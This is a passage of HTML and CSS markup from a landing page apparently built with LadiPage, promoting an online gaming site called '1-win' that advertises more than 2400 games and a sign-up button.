			color: rgb(0, 0, 0);
			text-align: left;
		}

		#HEADLINE80>.ladi-headline {
			font-family: Roboto, sans-serif;
			font-weight: bold;
			line-height: 1.2;
			color: rgb(66, 66, 66);
			letter-spacing: 2px;
			text-align: left;
		}

		#GROUP81 {
			height: 42px;
		}

		#SHAPE82 svg:last-child {
			fill: rgb(150, 150, 150);
		}

		#PARAGRAPH83>.ladi-paragraph,
		#PARAGRAPH86>.ladi-paragraph,
		#PARAGRAPH89>.ladi-paragraph {
			font-family: "Open Sans", sans-serif;
			font-size: 13px;
			line-height: 1.6;
			color: rgb(97, 97, 97);
			text-align: left;
		}

		#GROUP84 {
			height: 21px;
		}

		#SHAPE85 {
			height: 20px;
			top: 1px;
			left: 0px;
		}

		#SHAPE85 svg:last-child {
			fill: rgb(150, 147, 147);
		}

		#SHAPE88 svg:last-child {
			fill: rgb(153, 144, 144);
		}

		#HEADLINE90>.ladi-headline {
			font-family: "Open Sans", sans-serif;
			font-size: 16px;
			font-weight: bold;
			line-height: 1.2;
			color: rgb(66, 66, 66);
			letter-spacing: 2px;
			text-align: left;
		}

		#SHAPE92 svg:last-child,
		#SHAPE93 svg:last-child {
			fill: rgb(128, 128, 128);
		}

		#SECTION175>.ladi-section-background {
			background-color: rgb(17, 10, 92);
		}

		#PARAGRAPH184 {
			width: 131px;
		}

		#PARAGRAPH184>.ladi-paragraph,
		#PARAGRAPH186>.ladi-paragraph,
		#PARAGRAPH185>.ladi-paragraph {
			font-size: 18px;
			line-height: 1.6;
			color: rgb(255, 255, 255);
		}

		#PARAGRAPH186 {
			width: 106px;
		}

		#PARAGRAPH185 {
			width: 171px;
		}

		@media (min-width: 768px) {
			#SECTION2 {
				height: 779px;
			}

			#HEADLINE5 {
				width: 1103px;
				top: 130px;
				left: -68px;
			}

			#HEADLINE5>.ladi-headline {
				font-size: 43px;
				line-height: 1.2;
			}

			#BUTTON173 {
				width: 256px;
				height: 64px;
				top: 414px;
				left: 352px;
			}

			#BUTTON_TEXT173 {
				width: 251px;
			}

			#BUTTON_TEXT173>.ladi-headline {
				font-size: 22px;
			}

			#SECTION9 {
				height: 389px;
			}

			#GROUP11 {
				height: 211px;
				top: 58px;
				left: 0px;
			}

			#GROUP12 {
				height: 89px;
			}

			#HEADLINE13>.ladi-headline,
			#HEADLINE28>.ladi-headline,
			#HEADLINE33>.ladi-headline {
				line-height: 1.2;
			}

			#PARAGRAPH14>.ladi-paragraph {
				font-size: 17px;
			}

			#SHAPE15 {
				width: 110px;
				height: 110px;
				left: 89.5px;
			}

			#GROUP26 {
				width: 285.5px;
				height: 207px;
				top: 58px;
				left: 346.5px;
			}

			#GROUP27 {
				width: 285.5px;
				height: 86px;
				top: 121px;
			}

			#PARAGRAPH29 {
				width: 265px;
				left: 20.5px;
			}

			#PARAGRAPH29>.ladi-paragraph,
			#PARAGRAPH34>.ladi-paragraph,
			#PARAGRAPH173>.ladi-paragraph {
				font-size: 16px;
			}

			#SHAPE30 {
				width: 107px;
				height: 107px;
				left: 89px;
			}

			#GROUP31 {
				width: 290.25px;
				height: 208px;
				top: 58px;
				left: 678px;
			}

			#GROUP32 {
				width: 290.25px;
				height: 86px;
			}

			#PARAGRAPH34 {
				width: 280px;
				left: 10.25px;
			}

			#SHAPE35 {
				width: 109px;
				height: 109px;
				left: 88px;
			}

			#SECTION172 {
				height: 491.45px;
			}

			#BOX172 {
				width: 1692px;
				height: 510.45px;
				top: -19px;
				left: -284px;
			}

			#BOX172>.ladi-box {
				background-image: url("https://w.ladicdn.com/s2000x850/57b167c9ca57d39c18a1c57c/rmohlu3n20200311074122.jpg");
			}

			#GROUP198 {
				width: 172px;
				height: 111.5px;
				top: 150.7px;
				left: 65.5px;
			}

			#SHAPE171 {
				top: 0px;
				left: 36.5px;
			}

			#HEADLINE182,
			#GROUP202,
			#HEADLINE190,
			#GROUP203,
			#HEADLINE192,
			#GROUP204,
			#HEADLINE194 {
				width: 172px;
			}

			#HEADLINE182,
			#HEADLINE190,
			#HEADLINE192,
			#HEADLINE194 {
				top: 18.75px;
			}

			#HEADLINE182>.ladi-headline,
			#HEADLINE190>.ladi-headline,
			#HEADLINE192>.ladi-headline,
			#HEADLINE194>.ladi-headline {
				font-size: 30px;
			}

			#SHAPE172,
			#SHAPE179,
			#SHAPE180,
			#SHAPE181,
			#SHAPE182,
			#SHAPE183,
			#SHAPE184 {
				left: 36.5px;
			}

			#HEADLINE183 {
				top: 89.5px;
				left: 18px;
			}

			#HEADLINE183>.ladi-headline,
			#HEADLINE191>.ladi-headline,
			#HEADLINE193>.ladi-headline,
			#HEADLINE195>.ladi-headline,
			#HEADLINE80>.ladi-headline {
				font-size: 20px;
			}

			#GROUP202 {
				top: 150.7px;
				left: 305px;
			}

			#HEADLINE191,
			#HEADLINE193,
			#HEADLINE195 {
				left: 18px;
			}

			#GROUP203 {
				top: 150.7px;
				left: 549px;
			}

			#GROUP204 {
				top: 150.7px;
				left: 762px;
			}

			#HEADLINE223,
			#HEADLINE224 {
				width: 700px;
			}

			#HEADLINE223 {
				top: 15.8px;
				left: 13px;
			}

			#HEADLINE224 {
				top: 70.087px;
				left: 190px;
			}

			#HEADLINE229 {
				width: 260px;
				top: -2.2px;
				left: 410px;
			}

			#SECTION174 {
				height: 2368.63px;
			}

			#GROUP231 {
				width: 1516.38px;
				height: 2368.63px;
				top: 0px;
				left: -371px;
			}

			#BOX198 {
				width: 1428.2px;
				height: 2368.63px;
				left: 88.1793px;
			}

			#BOX198>.ladi-box {
				background-image: url("https://w.ladicdn.com/s1750x2700/57b167c9ca57d39c18a1c57c/xzg-ajfe20200507064152.jpg");
			}

			#BOX199 {
				width: 864.49px;
				height: 469.87px;
				top: 549.593px;
			}

			#IMAGE172 {
				width: 400px;
				height: 380px;
				top: -0.683px;
				left: 560px;
			}

			#IMAGE172>.ladi-image>.ladi-image-background {
				width: 712.742px;
				height: 570.194px;
				top: -96.2023px;
				left: -283px;
				background-image: url("https://w.ladicdn.com/s1050x900/5ea845b95da1a2557f302daa/cu8ark1-20231006092044.jpg");
			}

			#HEADLINE226 {
				width: 485px;
				top: 44.317px;
				left: 47px;
			}

			#BUTTON174 {
				top: 398.317px;
				left: 667px;
			}

			#BUTTON_TEXT174 {
				width: 184px;
			}

			#BUTTON_TEXT174>.ladi-headline {
				font-size: 21px;
			}

			#PARAGRAPH173 {
				width: 486px;
				top: 150.55px;
				left: 58px;
			}

			#PARAGRAPH174 {
				top: 458.95px;
				left: 527px;
			}

			#PARAGRAPH175 {
				top: 810.95px;
				left: 46.5px;
			}

			#PARAGRAPH176 {
				top: 1152.08px;
				left: 527px;
			}

			#PARAGRAPH177 {
				top: 1502.55px;
				left: 44.024px;
			}

			#PARAGRAPH178 {
				top: 1777.55px;
				left: 538.5px;
			}

			#IMAGE173 {
				top: 458.95px;
				left: 67px;
			}

			#IMAGE174 {
				top: 828.583px;
				left: 527px;
			}

			#IMAGE175 {
				top: 1152.08px;
				left: 60.548px;
			}

			#IMAGE176 {
				top: 1448.99px;
				left: 551.202px;
			}

			#IMAGE177 {
				top: 1777.55px;
				left: 97px;
			}

			#PARAGRAPH179 {
				width: 827px;
				top: 2108.55px;
				left: 89.5px;
			}

			#SECTION42 {
				height: 362.5px;
			}

			#HEADLINE43 {
				width: 618px;
				top: 41px;
				left: 171px;
			}

			#GROUP45 {
				width: 320px;
				height: 127px;
				top: 154.776px;
				left: 10.36px;
			}

			#PARAGRAPH47,
			#PARAGRAPH89 {
				width: 223px;
			}

			#PARAGRAPH47 {
				left: 97px;
			}

			#PARAGRAPH47>.ladi-paragraph,
			#PARAGRAPH52>.ladi-paragraph,
			#PARAGRAPH57>.ladi-paragraph {
				font-size: 14px;
			}

			#PARAGRAPH48 {
				width: 242px;
				top: 110px;
			}

			#GROUP50 {
				width: 309.24px;
				height: 130.161px;
				top: 150.5px;
				left: 333.4px;
			}

			#BOX51,
			#BOX201 {
				width: 85.1083px;
				height: 92.4223px;
			}

			#PARAGRAPH52 {
				width: 214px;
				top: 4.65018px;
				left: 95.2404px;
			}

			#PARAGRAPH53 {
				width: 245px;
				top: 113.161px;
				left: 0px;
			}

			#GROUP55 {
				width: 318.055px;
				height: 141.848px;
				top: 139.395px;
				left: 647.909px;
			}

			#BOX56 {
				width: 87.6247px;
				height: 96.3551px;
			}

			#PARAGRAPH57 {
				width: 220px;
				top: 4.84806px;
				left: 98.0555px;
			}

			#PARAGRAPH58 {
				width: 252px;
				top: 111.231px;
				left: 14.8705px;
			}

			#BOX201 {
				top: 139.395px;
				left: 0px;
			}

			#SECTION60 {
				height: 266px;
			}

			#HEADLINE61 {
				width: 378px;
				top: 73px;
				left: 299.02px;
			}

			#IMAGE63 {
				top: 158px;
				left: 374.313px;
			}

			#IMAGE64,
			#IMAGE64>.ladi-image>.ladi-image-background {
				width: 199.328px;
			}

			#IMAGE64 {
				top: 190.313px;
				left: 766.172px;
			}

			#IMAGE65 {
				top: 171.094px;
				left: 591.516px;
			}

			#IMAGE66,
			#IMAGE66>.ladi-image>.ladi-image-background {
				width: 108.453px;
				height: 50.1406px;
			}

			#IMAGE66 {
				top: 181.516px;
				left: 198.797px;
			}

			#IMAGE67,
			#IMAGE67>.ladi-image>.ladi-image-background {
				height: 62.5156px;
			}

			#IMAGE67 {
				top: 175.969px;
				left: -3.75px;
			}

			#SECTION76 {
				height: 386px;
			}

			#GROUP194 {
				width: 288px;
				height: 254.06px;
				top: 85.94px;
				left: 672px;
			}

			#HEADLINE79 {
				width: 239px;
				left: 3.5px;
			}

			#HEADLINE80,
			#HEADLINE90 {
				width: 248px;
			}

			#HEADLINE80 {
				top: 61px;
				left: 4.5px;
			}

			#GROUP81 {
				width: 288px;
				top: 99px;
			}

			#SHAPE82,
			#SHAPE88 {
				width: 20px;
				height: 20px;
				top: 1px;
			}

			#PARAGRAPH83 {
				width: 263px;
			}

			#PARAGRAPH83,
			#PARAGRAPH86,
			#PARAGRAPH89 {
				left: 25px;
			}

			#GROUP84 {
				width: 246px;
				top: 141px;
				left: 0px;
			}

			#SHAPE85 {
				width: 20px;
			}

			#PARAGRAPH86 {
				width: 221px;
			}

			#GROUP87 {
				width: 248px;
				height: 21px;
				top: 169px;
				left: 0px;
			}

			#HEADLINE90 {
				top: 231px;
			}

			#GROUP91 {
				width: 111.5px;
				height: 48.0603px;
				top: 206px;
				left: 4.5px;
			}

			#SHAPE92,
			#SHAPE93 {
				width: 48.0603px;
				height: 48.0603px;
			}

			#SHAPE93 {
				left: 63.4397px;
			}

			#SECTION176 {
				height: 261.95px;
			}

			#HTML_CODE172 {
				width: 6130px;
				height: 261.95px;
				left: -2585px;
			}

			#SECTION175 {
				height: 118px;
			}

			#PARAGRAPH184 {
				top: 46px;
				left: 140.5px;
			}

			#PARAGRAPH186 {
				top: 46px;
				left: 708.5px;
			}

			#PARAGRAPH185 {
				top: 46px;
				left: 404px;
			}
		}

		@media (max-width: 767px) {
			#SECTION2 {
				height: 487px;
			}

			#HEADLINE5 {
				width: 416px;
				top: 41px;
				left: 4px;
			}

			#HEADLINE5>.ladi-headline {
				font-size: 28px;
				line-height: 1.6;
			}

			#BUTTON173 {
				width: 160px;
				height: 40px;
				top: 388px;
				left: 130px;
			}

			#BUTTON_TEXT173 {
				width: 155px;
			}

			#BUTTON_TEXT173>.ladi-headline,
			#PARAGRAPH14>.ladi-paragraph,
			#PARAGRAPH29>.ladi-paragraph,
			#PARAGRAPH34>.ladi-paragraph,
			#HEADLINE183>.ladi-headline,
			#HEADLINE191>.ladi-headline,
			#HEADLINE193>.ladi-headline,
			#HEADLINE195>.ladi-headline,
			#BUTTON_TEXT174>.ladi-headline {
				font-size: 14px;
			}

			#SECTION9 {
				height: 770px;
			}

			#GROUP11 {
				height: 222px;
				top: 20px;
				left: 69.5px;
			}

			#GROUP12 {
				height: 100px;
			}

			#HEADLINE13>.ladi-headline,
			#HEADLINE28>.ladi-headline,
			#HEADLINE33>.ladi-headline {
				line-height: 1;
			}

			#SHAPE15,
			#SHAPE30,
			#SHAPE35 {
				width: 100px;
				height: 100px;
				left: 90px;
			}

			#GROUP26,
			#GROUP31 {
				width: 285px;
				height: 222px;
			}

			#GROUP26 {
				top: 253px;
				left: 69.5px;
			}

			#GROUP27,
			#GROUP32 {
				width: 285px;
				height: 100px;
			}

			#GROUP27 {
				top: 122px;
			}

			#PARAGRAPH29,
			#PARAGRAPH34,
			#PARAGRAPH47,
			#PARAGRAPH52,
			#PARAGRAPH57,
			#HEADLINE80,
			#HEADLINE90 {
				width: 211px;
			}

			#PARAGRAPH29,
			#PARAGRAPH34 {
				left: 41px;
			}

			#GROUP31 {
				top: 486px;
				left: 69.5px;
			}

			#SECTION172 {
				height: 1034.33px;
			}

			#BOX172 {
				width: 420px;
				height: 995.334px;
				top: 0px;
				left: 0px;
			}

			#BOX172>.ladi-box {
				background-image: url("https://w.ladicdn.com/s750x1300/57b167c9ca57d39c18a1c57c/rmohlu3n20200311074122.jpg");
			}

			#GROUP198 {
				width: 142px;
				height: 124px;
				top: 330px;
				left: 145.5px;
			}

			#SHAPE171 {
				top: 25px;
				left: 16.5px;
			}

			#HEADLINE182 {
				width: 142px;
				top: 32px;
			}

			#HEADLINE182>.ladi-headline,
			#HEADLINE190>.ladi-headline,
			#HEADLINE192>.ladi-headline,
			#HEADLINE194>.ladi-headline {
				font-size: 42px;
			}

			#SHAPE172 {
				left: 46.5px;
			}

			#HEADLINE183 {
				top: 102px;
				left: 0px;
			}

			#GROUP202,
			#HEADLINE190 {
				width: 266px;
			}

			#GROUP202 {
				top: 838.5px;
				left: 83.5px;
			}

			#SHAPE179,
			#SHAPE180 {
				left: 83.5px;
			}

			#HEADLINE190 {
				top: 22.25px;
			}

			#HEADLINE191 {
				left: 65px;
			}

			#GROUP203,
			#HEADLINE192 {
				width: 233px;
			}

			#GROUP203 {
				top: 657px;
				left: 93.5px;
			}

			#SHAPE181,
			#SHAPE182 {
				left: 75.5px;
			}

			#HEADLINE192 {
				top: 22.5px;
			}

			#HEADLINE193 {
				left: 57px;
			}

			#GROUP204,
			#HEADLINE194 {
				width: 153px;
			}

			#GROUP204 {
				top: 506.5px;
				left: 133.5px;
			}

			#SHAPE183,
			#SHAPE184 {
				left: 27px;
			}

			#HEADLINE194 {
				top: 16px;
			}

			#HEADLINE195 {
				left: 8.5px;
			}

			#HEADLINE223,
			#PARAGRAPH179 {
				width: 400px;
			}

			#HEADLINE223 {
				top: 1196.83px;
				left: 10px;
			}

			#HEADLINE224 {
				width: 345px;
				top: 179px;
				left: 44px;
			}

			#HEADLINE229 {
				width: 261px;
				top: 77.334px;
				left: 86px;
			}

			#SECTION174 {
				height: 4083.12px;
			}

			#GROUP231 {
				width: 450.5px;
				height: 4170.23px;
				top: -87.11px;
				left: -30.5px;
			}

			#BOX198 {
				width: 424.303px;
				height: 4170.23px;
				left: 26.1972px;
			}

			#BOX198>.ladi-box {
				background-image: url("https://w.ladicdn.com/s750x4500/57b167c9ca57d39c18a1c57c/xzg-ajfe20200507064152.jpg");
			}

			#BOX199 {
				width: 256.83px;
				height: 2006.68px;
				top: 2163.52px;
			}

			#IMAGE172 {
				width: 293.684px;
				height: 279px;
				top: 365.889px;
				left: 69.658px;
			}

			#IMAGE172>.ladi-image>.ladi-image-background {
				width: 523.303px;
				height: 418.643px;
				top: -70.6331px;
				left: -207.782px;
				background-image: url("https://w.ladicdn.com/s850x750/5ea845b95da1a2557f302daa/cu8ark1-20231006092044.jpg");
			}

			#HEADLINE226 {
				width: 390px;
				top: -18.111px;
				left: 21.5px;
			}

			#BUTTON174 {
				top: 669.89px;
				left: 123.5px;
			}

			#BUTTON_TEXT174 {
				width: 183px;
			}

			#PARAGRAPH173 {
				width: 410px;
				top: 102.889px;
				left: 11.5px;
			}

			#PARAGRAPH173>.ladi-paragraph {
				font-size: 15.44px;
			}

			#PARAGRAPH174 {
				top: 743.89px;
				left: 11px;
			}

			#PARAGRAPH175 {
				top: 1435.89px;
				left: 11px;
			}

			#PARAGRAPH176 {
				top: 2026.89px;
				left: 22.75px;
			}

			#PARAGRAPH177 {
				top: 2645.12px;
				left: 0px;
			}

			#PARAGRAPH178 {
				top: 3147.12px;
				left: 4.5px;
			}

			#IMAGE173 {
				top: 1050.26px;
				left: 36.538px;
			}

			#IMAGE174 {
				top: 1729.89px;
				left: 17.5px;
			}

			#IMAGE175 {
				top: 2875.45px;
				left: 18.024px;
			}

			#IMAGE176 {
				top: 2322.56px;
				left: 27.351px;
			}

			#IMAGE177 {
				top: 3414.12px;
				left: 30.976px;
			}

			#PARAGRAPH179 {
				top: 3668.12px;
				left: 5.976px;
			}

			#SECTION42 {
				height: 572px;
			}

			#HEADLINE43,
			#HEADLINE61 {
				width: 355px;
				top: 20px;
				left: 32.5px;
			}

			#GROUP45 {
				width: 293px;
				height: 107.5px;
				top: 264.25px;
				left: 68px;
			}

			#PARAGRAPH47 {
				left: 82px;
			}

			#PARAGRAPH47>.ladi-paragraph,
			#PARAGRAPH52>.ladi-paragraph,
			#PARAGRAPH57>.ladi-paragraph {
				font-size: 13px;
			}

			#PARAGRAPH48 {
				width: 65px;
				top: 90.5px;
			}

			#GROUP50 {
				width: 311px;
				height: 110.5px;
				top: 401.5px;
				left: 56px;
			}

			#BOX51,
			#BOX201 {
				width: 84px;
				height: 79.5px;
			}

			#PARAGRAPH52 {
				top: 17px;
				left: 100px;
			}

			#PARAGRAPH53 {
				width: 81px;
				top: 93.5px;
				left: 13px;
			}

			#GROUP55 {
				width: 305px;
				height: 131.536px;
				top: 78px;
				left: 60px;
			}

			#BOX56 {
				width: 84px;
				height: 90.1444px;
			}

			#PARAGRAPH57 {
				top: 4.53556px;
				left: 94px;
			}

			#PARAGRAPH58 {
				width: 63px;
				top: 100.536px;
				left: 13px;
			}

			#BOX201 {
				top: 264.25px;
				left: 53px;
			}

			#SECTION60 {
				height: 467.422px;
			}

			#IMAGE63 {
				top: 104.875px;
				left: 28.664px;
			}

			#IMAGE64,
			#IMAGE64>.ladi-image>.ladi-image-background {
				width: 199.312px;
			}

			#IMAGE64 {
				top: 339.25px;
				left: 126.344px;
			}

			#IMAGE65 {
				top: 104.875px;
				left: 239.953px;
			}

			#IMAGE66,
			#IMAGE66>.ladi-image>.ladi-image-background {
				width: 108.438px;
				height: 50.125px;
			}

			#IMAGE66 {
				top: 235.812px;
				left: 252.562px;
			}

			#IMAGE67,
			#IMAGE67>.ladi-image>.ladi-image-background {
				height: 62.5px;
			}

			#IMAGE67 {
				top: 229.625px;
				left: 41.414px;
			}

			#SECTION76 {
				height: 483px;
			}

			#GROUP194 {
				width: 314.879px;
				height: 213px;
				top: 0px;
				left: 92.355px;
			}

			#HEADLINE79 {
				width: 203px;
				left: 1.70281px;
			}

			#HEADLINE80 {
				top: 49px;
				left: 7px;
			}

			#HEADLINE80>.ladi-headline {
				font-size: 16px;
			}

			#GROUP81 {
				width: 314.879px;
				top: 78.5198px;
			}

			#SHAPE82 {
				width: 25.8789px;
				height: 30.3955px;
				top: 0px;
			}

			#PARAGRAPH83 {
				width: 289px;
				left: 25.8789px;
			}

			#GROUP84 {
				width: 209.446px;
				top: 121px;
				left: 2.55431px;
			}

			#SHAPE85 {
				width: 17.0281px;
			}

			#PARAGRAPH86 {
				width: 188px;
			}

			#PARAGRAPH86,
			#PARAGRAPH89 {
				left: 21.2852px;
			}

			#GROUP87 {
				width: 211.149px;
				height: 23px;
				top: 153px;
				left: 1.70281px;
			}

			#SHAPE88 {
				width: 17.0281px;
				height: 21.9048px;
				top: 1.09524px;
			}

			#PARAGRAPH89 {
				width: 190px;
			}

			#HEADLINE90 {
				top: 176px;
			}

			#GROUP91 {
				width: 49.3815px;
				height: 25px;
				top: 188px;
				left: 143.883px;
			}

			#SHAPE92,
			#SHAPE93 {
				width: 21.2851px;
				height: 25px;
			}

			#SHAPE93 {
				left: 28.0964px;
			}

			#SECTION176 {
				height: 260.978px;
			}

			#HTML_CODE172 {
				width: 420px;
				height: 260px;
				left: 0px;
			}

			#SECTION175 {
				height: 143.25px;
			}

			#PARAGRAPH184 {
				top: 15px;
				left: 144.5px;
			}

			#PARAGRAPH186 {
				top: 91px;
				left: 157px;
			}

			#PARAGRAPH185 {
				top: 53.125px;
				left: 124.5px;
			}
		}
	</style>
	<style id="style_lazyload" type="text/css">
		body.lazyload .ladi-overlay,
		body.lazyload .ladi-box,
		body.lazyload .ladi-button-background,
		body.lazyload .ladi-collection-item:before,
		body.lazyload .ladi-countdown-background,
		body.lazyload .ladi-form-item-background,
		body.lazyload .ladi-form-label-container .ladi-form-label-item.image,
		body.lazyload .ladi-frame-background,
		body.lazyload .ladi-gallery-view-item,
		body.lazyload .ladi-gallery-control-item,
		body.lazyload .ladi-headline,
		body.lazyload .ladi-image-background,
		body.lazyload .ladi-image-compare,
		body.lazyload .ladi-list-paragraph ul li:before,
		body.lazyload .ladi-section-background,
		body.lazyload .ladi-survey-option-background,
		body.lazyload .ladi-survey-option-image,
		body.lazyload .ladi-tabs-background,
		body.lazyload .ladi-video-background,
		body.lazyload .ladi-banner,
		body.lazyload .ladi-spin-lucky-screen,
		body.lazyload .ladi-spin-lucky-start {
			background-image: none !important;
		}
	</style>
</head>

<body class="lazyload"><svg xmlns="http://www.w3.org/2000/svg"
		style="width: 0px; height: 0px; position: absolute; overflow: hidden; display: none;">
		<symbol id="shape_dYBAOLXKDx" viewBox="0 0 134.5 134.5">
			<path
				d="M67.25,85.13A17.88,17.88,0,1,1,85.14,67.25,17.91,17.91,0,0,1,67.25,85.13Zm0-31.08a13.2,13.2,0,1,0,13.2,13.2A13.21,13.21,0,0,0,67.25,54.05Z">
			</path>
			<path
				d="M67.25,100.49a33.24,33.24,0,0,1,0-66.48h1.4V38.7h-1.4A28.55,28.55,0,1,0,95.8,67.25v-1.4h4.69v1.4A33.28,33.28,0,0,1,67.25,100.49Z">
			</path>
			<path
				d="M67.25,121.22a54,54,0,0,1-54-54v-1.4H18v1.4A49.28,49.28,0,1,0,84.36,21l-1.31-.49,1.63-4.39,1.31.48a54,54,0,0,1-18.74,104.6Z">
			</path>
			<path
				d="M68.65,134.5h-1.4a67.24,67.24,0,1,1,54.69-28.11l-.81,1.13-3.81-2.73.82-1.13a62.57,62.57,0,1,0-50.89,26.15h1.4Z">
			</path>
		</symbol>
		<symbol id="shape_LnMLZBVqKf" viewBox="0 0 29.77 29.77">
			<circle cx="14.89" cy="14.89" r="14.89"></circle>
		</symbol>
	</svg>
	<div class="ladi-wraper">
		<div id="SECTION2" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-overlay"></div>
			<div class="ladi-container">
				<div id="HEADLINE5" class='ladi-element'>
					<h1 class='ladi-headline'>GREETINGS TO 1-WIN GAMING! WE'RE DELIGHTED BY YOUR PRESENCE TODAY AND
						APPRECIATE YOU TAKING THE TIME TO SHARE YOUR SUGGESTIONS WITH US.</h1>
				</div><a href="tel:+44 20 1231 1234" id="BUTTON173" class='ladi-element'>
					<div class='ladi-button ladi-transition'>
						<div class="ladi-button-background"></div>
						<div id="BUTTON_TEXT173" class='ladi-element ladi-button-headline'>
							<p class='ladi-headline ladi-transition'>Create account now</p>
						</div>
					</div>
				</a>
			</div>
		</div>
		<div id="SECTION9" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="GROUP11" class='ladi-element'>
					<div class='ladi-group'>
						<div id="GROUP12" class='ladi-element'>
							<div class='ladi-group'>
								<div id="HEADLINE13" class='ladi-element'>
									<h5 class='ladi-headline'>TIME &amp; DEVICE</h5>
								</div>
								<div id="PARAGRAPH14" class='ladi-element'>
									<div class='ladi-paragraph'>You can play anytime, anywhere on any device</div>
								</div>
							</div>
						</div>
						<div id="SHAPE15" class='ladi-element'>
							<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg"
									xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px"
									viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve"
									preserveAspectRatio="none" width="100%" height="100%" class=""
									fill="rgba(255,255,255,1)">
									<g>
										<circle cx="51" cy="28.2" r="0.8"></circle>
										<path
											d="M91.9,68.9h-5.6V28c0-3-2.5-5.5-5.5-5.5H20.6c-3,0-5.5,2.5-5.5,5.5v41H9.4c-1.2,0-2.2,1-2.2,2.2v2.3c0,4.2,3.4,7.6,7.6,7.6   h71.7c4.2,0,7.6-3.4,7.6-7.6v-2.3C94.1,69.9,93.1,68.9,91.9,68.9z M19.4,28c0-0.6,0.5-1.1,1.1-1.1h60.2c0.6,0,1.1,0.5,1.1,1.1v41   H61.4c-1.2,0-2.1,0.9-2.2,2H42.1c-0.1-1.1-1-2-2.2-2H19.4V28z M89.7,73.5c0,1.8-1.4,3.2-3.2,3.2H14.8c-1.7,0-3.2-1.4-3.2-3.2v-0.1   H38c0.6,1.2,1.8,2,3.2,2H60c1.4,0,2.6-0.8,3.2-2L89.7,73.5L89.7,73.5L89.7,73.5z">
										</path>
										<path
											d="M79.6,62.7V33.6c0-2.1-1.7-3.9-3.9-3.9H25.9c-2.1,0-3.9,1.7-3.9,3.9v29.1c0,2.1,1.7,3.9,3.9,3.9h49.9   C77.9,66.5,79.6,64.8,79.6,62.7z M24.2,62.7V33.6c0-0.9,0.8-1.7,1.7-1.7h49.9c0.9,0,1.7,0.8,1.7,1.7v29.1c0,0.9-0.8,1.7-1.7,1.7   H25.9C24.9,64.3,24.2,63.6,24.2,62.7z">
										</path>
									</g>
								</svg></div>
						</div>
					</div>
				</div>
				<div id="GROUP26" class='ladi-element'>
					<div class='ladi-group'>
						<div id="GROUP27" class='ladi-element'>
							<div class='ladi-group'>
								<div id="HEADLINE28" class='ladi-element'>
									<h5 class='ladi-headline'>REVIEW</h5>
								</div>
								<div id="PARAGRAPH29" class='ladi-element'>
									<div class='ladi-paragraph'>1-win is one of the most worth-playing online games
										today</div>
								</div>
							</div>
						</div>
						<div id="SHAPE30" class='ladi-element'>
							<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"
									preserveAspectRatio="none" viewBox="0 0 1792 1896.0833" class=""
									fill="rgba(255,255,255,1)">
									<path
										d="M896 1664q-26 0-44-18l-624-602q-10-8-27.5-26T145 952.5 77 855 23.5 734 0 596q0-220 127-344t351-124q62 0 126.5 21.5t120 58T820 276t76 68q36-36 76-68t95.5-68.5 120-58T1314 128q224 0 351 124t127 344q0 221-229 450l-623 600q-18 18-44 18z">
									</path>
								</svg></div>
						</div>
					</div>
				</div>
				<div id="GROUP31" class='ladi-element'>
					<div class='ladi-group'>
						<div id="GROUP32" class='ladi-element'>
							<div class='ladi-group'>
								<div id="HEADLINE33" class='ladi-element'>
									<h5 class='ladi-headline'>ABOUT THE GAME</h5>
								</div>
								<div id="PARAGRAPH34" class='ladi-element'>
									<div class='ladi-paragraph'>With more than 2400 different games for players to
										choose from</div>
								</div>
							</div>
						</div>
						<div id="SHAPE35" class='ladi-element'>
							<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"
									preserveAspectRatio="none" viewBox="0 0 1920 1896.0833" class=""
									fill="rgba(255,255,255,1)">
									<path
										d="M832 1088V960q0-14-9-23t-23-9H608V736q0-14-9-23t-23-9H448q-14 0-23 9t-9 23v192H224q-14 0-23 9t-9 23v128q0 14 9 23t23 9h192v192q0 14 9 23t23 9h128q14 0 23-9t9-23v-192h192q14 0 23-9t9-23zm576 64q0-53-37.5-90.5T1280 1024t-90.5 37.5-37.5 90.5 37.5 90.5 90.5 37.5 90.5-37.5 37.5-90.5zm256-256q0-53-37.5-90.5T1536 768t-90.5 37.5T1408 896t37.5 90.5 90.5 37.5 90.5-37.5T1664 896zm256 128q0 212-150 362t-362 150q-192 0-338-128H850q-146 128-338 128-212 0-362-150T0 1024t150-362 362-150h896q212 0 362 150t150 362z">
									</path>
								</svg></div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="SECTION172" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="BOX172" class='ladi-element'>
					<div class='ladi-box ladi-transition'>
						<div class="ladi-overlay"></div>
					</div>
				</div>
				<div id="GROUP198" class='ladi-element'>
					<div class='ladi-group'>
						<div id="SHAPE171" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 134.5 134.5"
									fill="rgba(235, 243, 255, 0.1)">
									<use xlink:href="#shape_dYBAOLXKDx"></use>
								</svg></div>
						</div>
						<div id="HEADLINE182" class='ladi-element'>
							<h3 class='ladi-headline ladi-transition'><span style="font-weight: bold;">2400+</span></h3>
						</div>
						<div id="SHAPE172" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 29.77 29.77"
									fill="rgba(235, 243, 255, 0.2)">
									<use xlink:href="#shape_LnMLZBVqKf"></use>
								</svg></div>
						</div>
						<div id="HEADLINE183" class='ladi-element'>
							<h3 class='ladi-headline ladi-transition'>Games</h3>
						</div>
					</div>
				</div>
				<div id="GROUP202" class='ladi-element'>
					<div class='ladi-group'>
						<div id="SHAPE179" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 134.5 134.5"
									fill="rgba(235, 243, 255, 0.1)">
									<use xlink:href="#shape_dYBAOLXKDx"></use>
								</svg></div>
						</div>
						<div id="HEADLINE190" class='ladi-element'>
